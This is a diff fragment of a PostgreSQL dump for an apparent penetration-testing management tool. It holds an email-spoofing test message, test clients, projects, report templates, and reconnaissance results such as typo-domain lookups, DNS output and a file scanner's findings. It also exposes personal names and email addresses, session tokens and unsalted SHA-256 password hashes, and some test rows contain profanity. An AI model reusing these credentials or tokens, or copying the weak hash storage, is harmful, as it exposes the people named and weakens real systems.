:&lt;InternalName2@domain.ch&gt;</li></ul><span>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br></span><ol><li>\r\nFROM: InternalName1</li><li>TO: InternalName2</li></ol><span><span>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>
+\.
+
+
+--
+-- TOC entry 2243 (class 0 OID 21693)
+-- Dependencies: 158
+-- Data for Name: clients; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY clients (id, name, country, state, city, address, postcode, website, contact_name, contact_phone, contact_email, contact_fax, logo_path, logo_type) FROM stdin;
+2	Ziga										\N	\N	\N
+4	Helloy										123-123-123	\N	\N
+1	Test	Switzerland		Zurich	Kallison Lane, 7	123456	http://netprotect.ch	Ivan John		invan@john.com	123-123-123	40453852965cebb2b0dbc5440323bea3f5adf750c8b5f72e06b5fc7a9aad9da4	image/png
+\.
+
+
+--
+-- TOC entry 2244 (class 0 OID 21701)
+-- Dependencies: 160
+-- Data for Name: emails; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY emails (id, user_id, subject, content, attempts, sent) FROM stdin;
+\.
+
+
+--
+-- TOC entry 2245 (class 0 OID 21711)
+-- Dependencies: 162
+-- Data for Name: languages; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY languages (id, name, code, "default") FROM stdin;
+1	English	en	t
+2	Deutsch	de	f
+\.
+
+
+--
+-- TOC entry 2272 (class 0 OID 28213)
+-- Dependencies: 202
+-- Data for Name: login_history; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY login_history (id, user_id, user_name, create_time) FROM stdin;
+1	1	Oliver Muenchow	2013-01-20 19:00:34.601315
+2	1	Oliver Muenchow	2013-01-20 19:00:46.822096
+3	1	Oliver Muenchow	2013-01-21 00:36:16.786873
+4	1	Oliver Muenchow	2013-01-21 00:36:48.513369
+5	1	Oliver Muenchow	2013-01-21 01:39:25.282192
+7	1	Oliver Muenchow	2013-01-21 01:41:35.632161
+6	\N	test@client.com	2013-01-21 01:41:18.967625
+8	1	Oliver Muenchow	2013-01-21 12:45:25.103189
+9	1	Oliver Muenchow	2013-01-21 18:55:41.217336
+10	1	Oliver Muenchow	2013-01-22 00:09:47.837418
+11	1	Oliver Muenchow	2013-01-22 12:48:55.146417
+12	1	Oliver Muenchow	2013-01-22 14:48:23.294127
+13	1	Oliver Muenchow	2013-01-22 19:29:43.01782
+14	1	Oliver Muenchow	2013-01-23 17:36:02.634146
+15	1	Oliver Muenchow	2013-01-24 06:05:48.900624
+16	1	Oliver Muenchow	2013-01-24 19:51:32.786624
+17	1	Oliver Muenchow	2013-02-07 16:25:53.558536
+18	1	Oliver Muenchow	2013-02-08 16:11:20.123214
+19	1	Oliver Muenchow	2013-02-08 19:36:41.043217
+20	1	Oliver Muenchow	2013-02-09 02:51:28.691028
+21	1	Oliver Muenchow	2013-02-09 02:59:42.890879
+22	1	Oliver Muenchow	2013-02-09 04:40:16.891014
+23	1	Oliver Muenchow	2013-02-09 07:15:45.180509
+\.
+
+
+--
+-- TOC entry 2246 (class 0 OID 21719)
+-- Dependencies: 164
+-- Data for Name: project_details; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY project_details (id, project_id, subject, content) FROM stdin;
+2	1	hello	world
+3	2	kekek	kkk\r\n
+4	1	yaya	aazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzzaazzzzzzzzzzzzzz
+\.
+
+
+--
+-- TOC entry 2262 (class 0 OID 26344)
+-- Dependencies: 187
+-- Data for Name: project_users; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY project_users (project_id, user_id, admin) FROM stdin;
+13	1	t
+\.
+
+
+--
+-- TOC entry 2247 (class 0 OID 21727)
+-- Dependencies: 166
+-- Data for Name: projects; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY projects (id, client_id, year, deadline, name, status, vuln_overdue) FROM stdin;
+6	1	2012	2012-09-21	aaa	in_progress	\N
+3	1	2012	2012-09-21	xxx	open	\N
+4	2	2012	2012-09-21	yyy	open	\N
+8	2	2012	2012-09-21	ccc	open	\N
+9	2	2012	2012-09-21	fff	open	\N
+10	1	2012	2012-09-21	ddd	open	\N
+11	2	2012	2012-09-21	eee	open	\N
+12	2	2013	2012-09-21	kokokoko	open	\N
+5	1	2012	2012-09-21	zzz	finished	\N
+2	2	2012	2012-07-29	Fuck	finished	\N
+1	2	2012	2012-07-27	Test	in_progress	2012-09-28
+13	4	2012	2013-02-09	Buka	open	\N
+\.
+
+
+--
+-- TOC entry 2248 (class 0 OID 21736)
+-- Dependencies: 168
+-- Data for Name: references; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY "references" (id, name, url) FROM stdin;
+1	CUSTOM	
+\.
+
+
+--
+-- TOC entry 2270 (class 0 OID 28055)
+-- Dependencies: 199
+-- Data for Name: report_template_sections; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY report_template_sections (id, report_template_id, check_category_id, intro, sort_order, title) FROM stdin;
+4	1	1	key key	1	Key
+1	1	9	Project admin:&nbsp;{admin} hey<br><br>OLOLO<br><ul><li>все вы быдло</li><li>и хуйло</li></ul><br>	0	Hey
+\.
+
+
+--
+-- TOC entry 2271 (class 0 OID 28075)
+-- Dependencies: 200
+-- Data for Name: report_template_sections_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY report_template_sections_l10n (report_template_section_id, language_id, intro, title) FROM stdin;
+4	1	key key	Key
+4	2	\N	\N
+1	1	Project admin:&nbsp;{admin} hey<br><br>OLOLO<br><ul><li>все вы быдло</li><li>и хуйло</li></ul><br>	Hey
+1	2	Project admin:&nbsp;{admin}	kkkkk
+\.
+
+
+--
+-- TOC entry 2268 (class 0 OID 27336)
+-- Dependencies: 196
+-- Data for Name: report_template_summary; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY report_template_summary (id, summary, rating_from, rating_to, report_template_id, title) FROM stdin;
+4		1.00	2.00	1	Hello
+3	The general security state of the infrastructure is rated with a “{rating}”: low to medium critical”. This is a cumulative value that reflects the overall security\r\nstatus. Only a few problems can cause a severe impact. Therefore this value is\r\ndriven mainly by the vulnerabilities within a few devices.<br><br>Some of the vulnerabilities are critical. But none of them would help an\r\nattacker to immediately take over a system. Client "{client}" still has to be aware that this is only\r\na snapshot of the current situation. Any change in the future (like new\r\nexploits available for a specific system) could change the situation.&nbsp;<br><br><ul><li>list</li><li>goes here</li></ul><br>and here is a numbered list<br><ol><li>one</li><li>two</li></ol>yay<br>	0.00	5.00	1	Everything is fine!
+\.
+
+
+--
+-- TOC entry 2269 (class 0 OID 27347)
+-- Dependencies: 197
+-- Data for Name: report_template_summary_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY report_template_summary_l10n (report_template_summary_id, language_id, summary, title) FROM stdin;
+4	1	\N	Hello
+4	2	\N	\N
+3	1	The general security state of the infrastructure is rated with a “{rating}”: low to medium critical”. This is a cumulative value that reflects the overall security\r\nstatus. Only a few problems can cause a severe impact. Therefore this value is\r\ndriven mainly by the vulnerabilities within a few devices.<br><br>Some of the vulnerabilities are critical. But none of them would help an\r\nattacker to immediately take over a system. Client "{client}" still has to be aware that this is only\r\na snapshot of the current situation. Any change in the future (like new\r\nexploits available for a specific system) could change the situation.&nbsp;<br><br><ul><li>list</li><li>goes here</li></ul><br>and here is a numbered list<br><ol><li>one</li><li>two</li></ol>yay<br>	Everything is fine!
+3	2	\N	\N
+\.
+
+
+--
+-- TOC entry 2266 (class 0 OID 27306)
+-- Dependencies: 193
+-- Data for Name: report_templates; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY report_templates (id, name, header_image_path, header_image_type, intro, appendix, vulns_intro, info_checks_intro, security_level_intro, vuln_distribution_intro, reduced_intro, high_description, med_description, low_description, degree_intro, risk_intro) FROM stdin;
+3	Yay ;)	\N	\N					\N	\N	\N	\N	\N	\N	\N	\N
+1	Test Template	0caf7534e0fee7a603c2948652ab8de6815ccea0b277340d7122269f4a847c89	image/png	Test Template Intro<br><ul><li>The client is: {client}</li><li>The project is: {project}</li><li>Project year:&nbsp;<b>{year}</b></li></ul>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br><ol><li>Date from: {date.from}</li><li>Date to: {date.to}</li></ol>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}<br>This text goes after the list of targets.<br><b>well done<br><br>And here is a list of targets with controls lol:<br></b>{target.c.list}<br><b><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b><b>Here go top 5 vulns:<br></b>{vuln.5.list}<b><br></b>well done	Test Template Appendix<br><ol><li>one</li><li>two</li><li>three</li></ol>	World&nbsp;{client}	Info Checks go here ;)&nbsp;{client}	test one two {targets}<br><br><ul><li>hello</li><li>wtf is that</li></ul>No way<br><ol><li>one list</li><li>two lists</li></ol>	test one two&nbsp;{targets}<br><br>vuln distribution<br><br>with<br><ul><li>some</li><li>list</li></ul>	reduced targets {targets}	high risk&nbsp;targets {targets}	med risk&nbsp;targets {targets}	low risk&nbsp;targets {targets}	degree&nbsp;targets {targets}<br><br><ol><li>degree</li><li>list</li></ol>	risk&nbsp;targets {targets}<br><br>risk<br><ul><li>matrix</li><li>list</li></ul>
+\.
+
+
+--
+-- TOC entry 2267 (class 0 OID 27315)
+-- Dependencies: 194
+-- Data for Name: report_templates_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY report_templates_l10n (report_template_id, language_id, name, intro, appendix, vulns_intro, info_checks_intro, security_level_intro, vuln_distribution_intro, reduced_intro, high_description, med_description, low_description, degree_intro, risk_intro) FROM stdin;
+3	1	Yay ;)	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N
+3	2	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N
+1	2	zzz	Testen Templaten Intro	Testen Templaten Appendix	Worlda	\N	test eins zwei&nbsp;{targets}	test eins zwei&nbsp;{targets}	\N	\N	\N	\N	\N	\N
+1	1	Test Template	Test Template Intro<br><ul><li>The client is: {client}</li><li>The project is: {project}</li><li>Project year:&nbsp;<b>{year}</b></li></ul>Project deadline: {deadline}<br>Project admin: {admin}<br>Project rating: {rating}<br><ol><li>Date from: {date.from}</li><li>Date to: {date.to}</li></ol>Targets: {targets}<br><br><b>Here's a list of targets:</b><br>{target.list}<br>This text goes after the list of targets.<br><b>well done<br><br>And here is a list of targets with controls lol:<br></b>{target.c.list}<br><b><br></b>number of checks: {checks} (info: {checks.info}, low: {checks.lo}, med: {checks.med}, high: {checks.hi})<br><b><br></b><b>Here go top 5 vulns:<br></b>{vuln.5.list}<b><br></b>well done	Test Template Appendix<br><ol><li>one</li><li>two</li><li>three</li></ol>	World&nbsp;{client}	Info Checks go here ;)&nbsp;{client}	test one two {targets}<br><br><ul><li>hello</li><li>wtf is that</li></ul>No way<br><ol><li>one list</li><li>two lists</li></ol>	test one two&nbsp;{targets}<br><br>vuln distribution<br><br>with<br><ul><li>some</li><li>list</li></ul>	reduced targets {targets}	high risk&nbsp;targets {targets}	med risk&nbsp;targets {targets}	low risk&nbsp;targets {targets}	degree&nbsp;targets {targets}<br><br><ol><li>degree</li><li>list</li></ol>	risk&nbsp;targets {targets}<br><br>risk<br><ul><li>matrix</li><li>list</li></ul>
+\.
+
+
+--
+-- TOC entry 2258 (class 0 OID 22073)
+-- Dependencies: 183
+-- Data for Name: risk_categories; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY risk_categories (id, name, risk_template_id) FROM stdin;
+20	Pipa	6
+\.
+
+
+--
+-- TOC entry 2259 (class 0 OID 22082)
+-- Dependencies: 184
+-- Data for Name: risk_categories_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY risk_categories_l10n (risk_category_id, language_id, name) FROM stdin;
+20	1	Pipa
+20	2	\N
+\.
+
+
+--
+-- TOC entry 2260 (class 0 OID 24899)
+-- Dependencies: 185
+-- Data for Name: risk_category_checks; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY risk_category_checks (risk_category_id, check_id, damage, likelihood) FROM stdin;
+20	46	1	1
+20	48	1	1
+20	49	1	1
+20	1	1	1
+20	3	1	1
+20	45	1	1
+20	6	1	1
+20	7	1	1
+20	9	1	1
+20	10	1	1
+20	12	1	1
+20	13	1	1
+20	15	1	1
+20	16	1	1
+20	8	1	1
+20	11	1	1
+20	14	1	1
+20	5	1	1
+20	17	1	1
+20	47	1	1
+20	18	1	1
+20	19	1	1
+20	20	1	1
+20	21	1	1
+20	22	1	1
+20	23	1	1
+20	24	1	1
+20	25	1	1
+20	26	1	1
+20	27	1	1
+20	28	1	1
+20	29	1	1
+20	30	1	1
+20	31	1	1
+20	32	1	1
+20	33	1	1
+20	34	1	1
+20	35	1	1
+20	36	1	1
+20	37	1	1
+20	38	1	1
+20	39	1	1
+20	40	1	1
+20	41	1	1
+20	42	1	1
+20	43	1	1
+\.
+
+
+--
+-- TOC entry 2263 (class 0 OID 26361)
+-- Dependencies: 189
+-- Data for Name: risk_templates; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY risk_templates (id, name) FROM stdin;
+6	test
+\.
+
+
+--
+-- TOC entry 2264 (class 0 OID 26370)
+-- Dependencies: 190
+-- Data for Name: risk_templates_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY risk_templates_l10n (risk_template_id, language_id, name) FROM stdin;
+6	1	test
+6	2	\N
+\.
+
+
+--
+-- TOC entry 2261 (class 0 OID 26336)
+-- Dependencies: 186
+-- Data for Name: sessions; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY sessions (id, expire, data) FROM stdin;
+l942tbljgi7on6sp00rj13k414      	1360383337	yd7r-C1XZswtXPa0u_JBMbc7l-ly4p5A89AauB_6kC-NgZgmJS33KV7728P5so_DKgm0kv3ykOFAAB92dsLUM8cclw5y21F90K0DHXAp4n-VDrO91dzWQuvQ0ZJhLPyASKriTv4whbXhStvJUoTyrGXWBGLfwQuRfqIDw2mi64Riu-Za9wIcVp9CA-YcwBC49PExKaRqN_C52eOwFbpt_w..
+qacqlf8q8ukji4hkgt98ne5at5      	1360383648	UXihYUzVh9Otz2l3ySKWxiGWtPaNeJTOKneqh4p7fWdYFD5NXkzA1F85OKYyqaVlkq3Wzd18WPU5Sq8pAY1cO9ZUc5wrmYY2OjHTaEq8KobB4TkAlSFWsu0jyMKYDFUitwhoRmfM8teu91drVqWxyPKMiqbu7jEUNbgKil4MwJc6uN28Z40BRjnSAbobpRH8FU-fz-Ry4l8T06yKYMCA3pzbGL5nC5_pamho1HRigEp6-BGRx9kc4C8SyJzKn7jV0M9rrtOfVl2G725IuY6duvsm4MLU4VD1bHhSJHlm9N4vrLkVxdMCoKOlSS7662vRCPYazk2M7q1GjFYhMRWsKA..
+\.
+
+
+--
+-- TOC entry 2249 (class 0 OID 21744)
+-- Dependencies: 170
+-- Data for Name: system; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY system (id, backup) FROM stdin;
+1	2012-11-21 17:55:00.535688
+\.
+
+
+--
+-- TOC entry 2250 (class 0 OID 21749)
+-- Dependencies: 172
+-- Data for Name: target_check_attachments; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY target_check_attachments (target_id, check_id, name, type, path, size) FROM stdin;
+2	27	_eng_images_support_down_photo_m_ek (1).jpg	image/jpeg	fd3c6970b8053745020efceb15883a50147e657969a961540ab08ce18e564b7d	272561
+\.
+
+
+--
+-- TOC entry 2251 (class 0 OID 21756)
+-- Dependencies: 173
+-- Data for Name: target_check_categories; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY target_check_categories (target_id, check_category_id, advanced, check_count, finished_count, low_risk_count, med_risk_count, high_risk_count, info_count) FROM stdin;
+1	1	t	16	15	0	3	0	0
+1	6	t	18	1	0	0	0	0
+2	3	t	4	0	0	0	0	0
+1	8	t	0	0	0	0	0	0
+1	3	t	4	0	0	0	0	0
+1	4	t	1	0	0	0	0	0
+1	5	t	3	0	0	0	0	0
+1	10	t	0	0	0	0	0	0
+6	6	t	18	3	0	1	0	2
+1	2	t	1	1	0	0	0	1
+1	11	t	1	1	0	0	0	0
+4	1	t	16	0	0	0	0	0
+5	1	t	16	0	0	0	0	0
+2	6	t	18	5	0	2	0	2
+1	9	t	2	1	0	0	0	1
+\.
+
+
+--
+-- TOC entry 2252 (class 0 OID 21764)
+-- Dependencies: 174
+-- Data for Name: target_check_inputs; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY target_check_inputs (target_id, check_input_id, value, file, check_id) FROM stdin;
+1	1	asdfasdf	\N	1
+1	43	Some Default Value	\N	1
+1	44	1	\N	1
+1	5	120	\N	5
+1	6	1	\N	5
+1	15	\N	\N	17
+1	16	\N	\N	17
+1	45	multiple	\N	1
+1	7	0	\N	6
+2	31	10	\N	26
+2	32	php	\N	32
+1	42	google.com	\N	45
+1	46	1	ca9b973efccbd438b561c0bbe293d5d8aa65bac36d2462c8d9112dccdc7175f1	41
+1	47	0	fa650a3dca3d2e54caaf729e55f2a7a278db85450b48c212cd011b17f4123c3c	41
+1	12	\N	\N	13
+1	11	\N	ab5cc45403bbbf854133a57dd176be8a79aea45e9b9107d45eb634ac763ea322	12
+1	8	10	a93b7ccbb92e169a839b12760bd3ea2df83e9fb57f69629d887962f0136672fc	8
+1	9	10	c3aaa0222672bd78ce935654e50172da8374d6a2366d4896cd6e111375b3480a	8
+1	10	1	f6d144ffb1ee26991b62293e5c059cc598e5e2c00fdbfc15fee0831e989c8385	8
+1	14	0	e2d4e99aedc6467c533ceb9c476dfb64b1767bdc8f86f8ed4cba103d488b4cec	16
+1	13	0	77cceff0199091fdf1e9e51e7a0c66602a5e9379db0ac1f19efa623362c983cd	15
+\.
+
+
+--
+-- TOC entry 2253 (class 0 OID 21770)
+-- Dependencies: 175
+-- Data for Name: target_check_solutions; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY target_check_solutions (target_id, check_solution_id, check_id) FROM stdin;
+\.
+
+
+--
+-- TOC entry 2265 (class 0 OID 26906)
+-- Dependencies: 191
+-- Data for Name: target_check_vulns; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY target_check_vulns (target_id, check_id, user_id, deadline, status) FROM stdin;
+\.
+
+
+--
+-- TOC entry 2254 (class 0 OID 21773)
+-- Dependencies: 176
+-- Data for Name: target_checks; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY target_checks (target_id, check_id, result, target_file, rating, started, pid, status, result_file, language_id, protocol, port, override_target, user_id, table_result) FROM stdin;
+1	5	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+1	17	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+1	6	\N	\N	\N	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+1	14	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+1	11	query failed: NXDOMAIN	ba958ad7b51889ad6b8cfc6c06d9d334417e50010bafe54f2d3df41eb8bd7524	\N	2012-10-12 03:19:08.402282	\N	finished	7b0b9efbc239fb0be3e01c8c7409a51e49797f209f914961c7002a585541ddeb	1	\N	\N	fuck it all	1	\N
+2	26	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+2	28	\N	\N	hidden	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+2	29	\N	\N	info	\N	\N	finished	\N	1	http	\N	\N	1	\N
+6	28	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+6	29	\N	\N	info	\N	\N	finished	\N	1	http	\N	\N	1	\N
+2	27	\N	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+6	30	\N	\N	med_risk	\N	\N	finished	\N	1	http	\N	\N	1	\N
+1	8		b83d3c16886e3985ce1eb4c828ba1251d6488a13bb4d7ecc3be6670273200229	\N	2013-01-24 06:08:38.396468	\N	finished	bba14063fbb51e9345682ebe334b1a4c42d85f8be96ae847dcaee0f0f246cecd	1	\N	\N	google.com	1	<gtta-table><columns><column width="0.5" name="Domain"/><column width="0.5" name="IP"/></columns><row><cell>gosgle.com</cell><cell>54.248.125.234</cell></row><row><cell>googpe.com</cell><cell>69.6.27.100</cell></row><row><cell>googlz.com</cell><cell>204.13.160.107</cell></row><row><cell>koogle.com</cell><cell>208.87.34.15</cell></row><row><cell>koogle.com</cell><cell>74.86.197.160</cell></row><row><cell>grogle.com</cell><cell>141.8.224.106</cell></row><row><cell>goole.com</cell><cell>213.165.70.39</cell></row></gtta-table>
+1	13	No output.	5f60a27e9c2111670b7ac522d67ea4a28ea0f82830f54082b96b699dfe045aa4	\N	\N	\N	finished	3bff8cdab5a34d561ea20db0b51d64c820448d8d00dac24f0fab2fbe657acbe8	1	\N	\N	\N	1	\N
+1	47	No output.	daff9c357f092f45dd347a9ceb199488924a8148820d568eaede13a94728f2a1	\N	2012-11-26 07:09:01.609125	\N	finished	f08845086cba4dc36b7eaccd7071742540942bef7383300185ccb93211904cc6	1	http	80	infoguard.com	1	\N
+1	48	\N	\N	info	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+2	32	\N	\N	med_risk	\N	\N	finished	\N	1	http	\N	\N	1	\N
+1	46	w3af configuration errors:\n\nError while reading plugin options.\nThere was an error while importing plugins.discovery.halberd: "No module named shell".\n\nUnexpected end of script\n	7e392158a8cef25a48c51dc025382122caa04b7ee0f9abacc4d876e45e62b341	\N	2013-01-24 06:20:33.419926	\N	finished	2492cafeb2e0f1dafaa81e0fbb35065316626ab28204bf63f545bbaa4bd64217	1	\N	\N	netprotect.ch	1	\N
+1	7	Internal server error. Please send this error code to the administrator - A783BAE2332FE839.	8db8e350872d7f8f5a904757929873d40b4907527b806750727e9acb5fb0ae31	\N	\N	\N	finished	9efe9da38c259364f97fa07233a34a5bb43ae7a83ff2777ec8d021c8b72a40e5	1	\N	\N	80.248.198.9 - 80.248.198.14	1	\N
+1	9	Internal server error. Please send this error code to the administrator - 4500C4EA45249D2B.	2a29974663f07789e79bb70d5eeb12a174d8c3618de10bc50182f977e2f5c82b	\N	\N	\N	finished	6f1536eb2f83fd2dd9ca4c1a00424ce2af483b1ab4fbcc632125fae9a4128e7d	1	\N	\N	80.248.198.9	1	\N
+1	12	Nameserver                     IP                  SOA Serial      Refresh    Retry      Expire     Minimum\n-----------------------------------------------------------------------------------------------------------\nns3.google.com                 IP 216.239.36.10    SOA 2013015000  2h         30m        14d        5m        \nns4.google.com                 IP 216.239.38.10    SOA 2013015000  2h         30m        14d        5m        \nns1.google.com                 IP 216.239.32.10    SOA 2013015000  2h         30m        14d        5m        \nns2.google.com                 IP 216.239.34.10    SOA 2013015000  2h         30m        14d        5m        \nThe recommended syntax for serial number is YYYYMMDDnn (YYYY=year, MM=month, DD=day, nn=revision number), RFC 1912 (2013015000)\nThe recommended value for minimum TTL is 1 to 5 days, RFC 1912 (5m)\n	ef581d8726c59821f7e4f88bbe8cd78de01f23d24dfb1b132cfd4fce87c2f05e	\N	2013-01-21 02:01:22.216199	\N	finished	86a074c1f106e46b6a33cc55934da18d190ad034fa93254db0bd63593e705f8a	1	\N	\N	\N	1	\N
+1	16		39e7de7a2aad466f032a8a2f65d894c712d9f1b66651983c9969e44d3d26fa63	\N	2013-01-24 06:11:06.556805	\N	finished	82ebe7c26d634ad9f23b5ae5ecb12a4f8f80c178e633601916c2b51735860bb2	1	\N	\N	netprotect.ch	1	<gtta-table><columns><column width="0.3" name="Domain"/><column width="0.2" name="IP"/><column width="0.2" name="Whois"/><column width="0.3" name="Title"/></columns><row><cell>netprotect.com</cell><cell>54.243.62.158</cell><cell>NETPROTECT.COM</cell><cell>Unblock Us - smarter faster VPN</cell></row><row><cell>netprotect.info</cell><cell>82.98.86.173</cell><cell>na</cell><cell>netprotect.info - ÑÑÐ¾ Ð½Ð°Ð¸Ð»ÑÑÑÐ¸Ð¹ Ð¸ÑÑÐ¾ÑÐ½Ð¸Ðº Ð¸Ð½ÑÐ¾ÑÐ¼Ð°ÑÐ¸Ð¸ Ð¿Ð¾ ÑÐµÐ¼Ðµ netprotect. Ð­ÑÐ¾Ñ Ð²ÐµÐ±-ÑÐ°Ð¹Ñ Ð¿ÑÐ¾Ð´Ð°ÐµÑÑÑ</cell></row><row><cell>netprotect.net</cell><cell>208.91.197.54</cell><cell>NETPROTECT.NET</cell><cell>Loading...</cell></row><row><cell>netprotect.org</cell><cell>64.95.64.218</cell><cell>Buydomains.com</cell><cell>N/A</cell></row><row><cell>netprotect.ws</cell><cell>64.70.19.198</cell><cell>N/A</cell><cell>Find what you are looking for...</cell></row></gtta-table>
+1	1	kkkk	\N	med_risk	\N	\N	finished	\N	1	\N	\N	\N	1	<gtta-table>\n    <columns>\n        <column name="Value" width="0.3"/>\n        <column name="Name" width="0.3"/>\n        <column name="Data" width="0.4"/>\n    </columns>\n    <row>\n        <cell>1</cell>\n        <cell>1</cell>\n        <cell>1</cell>\n    </row>\n    <row>\n        <cell>1</cell>\n        <cell>1</cell>\n        <cell>1</cell>\n    </row>\n    <row>\n        <cell>1</cell>\n        <cell>1</cell>\n        <cell>1</cell>\n    </row>\n</gtta-table>
+1	45	No output.	\N	\N	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+1	15		cf3067eb8f2c87ca32d5dcb8f99d51a3bd1241c63b4d60ea9d273e66d8412f1d	\N	2013-01-24 06:15:02.631314	\N	finished	aa3754015e2174188254e999ebde44af5ad7304677cb66d8f4231e0b90394206	1	\N	\N	netprotect.ch	1	<gtta-table><columns><column width="0.5" name="Domain"/><column width="0.5" name="IP"/></columns><row><cell>dev.netprotect.ch</cell><cell>81.6.58.118</cell></row><row><cell>Wildcard DNS: 15 hostname(s)</cell><cell>213.239.210.108</cell></row></gtta-table>
+1	10	No output.	\N	\N	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+1	3	No output.	\N	\N	\N	\N	finished	\N	1	\N	\N	\N	1	\N
+1	27	tried 879 time(s) with 0 successful time(s)\n	d1ed11b5e9259aa95e347e6cfb242c6f29264193deff6dca98e7fd06e1ec0ca4	\N	2013-01-21 01:52:55.779798	\N	finished	30a05cb7ef48b856ec5256e9ee09e294c7a9fe0776f94879bc71ee50c2a2be63	1	\N	\N	onexchanger.com	1	\N
+1	41	**** running Interesting files and dirs scanner ****\n+ interesting Files And Dirs takes awhile....\n+ interesting File or Dir Found: "/logon.php\r"\n+ Item "/logon.php\r" contains header: "Content-Length: 0" MAYBE a False Positive or is empty!\n+ interesting File or Dir Found: "/backend.php\r"\n+ Item "/backend.php\r" contains header: "Content-Length: 0" MAYBE a False Positive or is empty!\n+ interesting File or Dir Found: "/"\n	6b645ef5542a30fab667de4727ebeee69906af3bac2de527b3689cbd1e24d4dd	\N	2013-02-09 07:20:37.218053	\N	finished	a4664d7394c7d9a5948b7189a0172e319ab95c0e36892980421848a3fa8dcf10	1	\N	\N	demonstratr.com	1	\N
+\.
+
+
+--
+-- TOC entry 2255 (class 0 OID 21780)
+-- Dependencies: 177
+-- Data for Name: target_references; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY target_references (target_id, reference_id) FROM stdin;
+1	1
+2	1
+3	1
+4	1
+5	1
+6	1
+\.
+
+
+--
+-- TOC entry 2256 (class 0 OID 21783)
+-- Dependencies: 178
+-- Data for Name: targets; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY targets (id, project_id, host, description) FROM stdin;
+3	1	empty.com	\N
+4	2	127.0.0.1	\N
+5	12	127.0.0.1	\N
+2	1	test.com	\N
+6	6	test.com	\N
+1	1	google.com	Main Webserver
+\.
+
+
+--
+-- TOC entry 2257 (class 0 OID 21791)
+-- Dependencies: 180
+-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY users (id, email, password, name, client_id, role, last_action_time, send_notifications) FROM stdin;
+3	erbol@gmail.com	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3		1	client	2013-01-20 17:53:45.446201	f
+1	oliver@muenchow.ch	a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3	Oliver Muenchow	\N	admin	2013-02-09 07:20:48.50516	t
+\.
+
+
+--
+-- TOC entry 2077 (class 2606 OID 21816)
 -- Dependencies: 142 142 142
 -- Name: check_categories_l10n_pkey; Type: CONSTRAINT; Schema: public; Owner: gtta; Tablespace: 
 --
@@ -1580,7 +2736,7 @@ ALTER TABLE ONLY check_categories_l10n
 
 
 --
--- TOC entry 2078 (class 2606 OID 21818)
+-- TOC entry 2075 (class 2606 OID 21818)
 -- Dependencies: 140 140
